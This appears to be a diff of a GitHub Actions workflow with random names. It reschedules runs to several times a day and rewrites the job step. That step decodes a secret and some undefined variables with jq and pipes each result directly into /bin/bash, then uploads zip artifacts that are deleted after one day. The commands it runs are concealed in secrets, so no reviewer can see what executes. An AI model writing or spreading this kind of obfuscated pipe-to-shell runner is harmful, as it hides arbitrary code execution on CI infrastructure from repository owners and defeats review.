@@ -1,10 +1,9 @@
 name: layerdiegostable
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '49 3/6 * * *'
 
+  schedule:
+    - cron: '52 1,7,13,19 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,8 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: layerdiegostable
         env:
-          tivjd02271: ${{ secrets.tivjd02271 }}
+          wsyxo6: ${{ secrets.wsyxo6 }}
         run: |
-          echo $tivjd02271 | jq -r .cc811 | /bin/bash
-          echo $g4 | jq -r .omjl61450 | /bin/bash
+          printf '%s' "$wsyxo6" | jq -r .vogjk8232 | /bin/bash
+          printf '%s' "$fprv1219" | jq -r .cyq79503 | /bin/bash
+          printf '%s' "$bm464" | jq -r .tjyr707 | /bin/bash
+          echo $i83 | jq -r .mkzo3714 | /bin/bash
+          printf '%s' "$y77" | jq -r .qcz44 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: t1lBw9LL
+          path: "*.zip"
+          retention-days: 1
